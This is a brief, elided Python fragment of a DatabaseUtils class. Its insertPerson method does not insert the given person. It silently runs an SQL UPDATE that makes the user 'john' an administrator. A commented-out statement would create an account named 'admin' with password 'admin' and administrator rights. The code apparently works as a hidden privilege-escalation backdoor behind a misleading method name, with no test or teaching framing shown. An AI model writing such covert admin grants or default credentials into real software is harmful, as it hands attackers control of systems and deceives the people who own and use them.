...
class DatabaseUtils:
    ...
    def insertPerson(self, name):
        with self.connection.cursor() as cursor:
            cursor.execute('UPDATE users SET typeOfUser = "Admin" WHERE username = "john"')
            ...
            #cursor.execute("INSERT INTO `users` (`id`, `username`, `password`, `firstName`, `lastName`, `email`, `typeOfUser`) VALUES (40, 'admin', 'admin', 'admin', 'admin', 'admin@admin.com', 'Admin')")
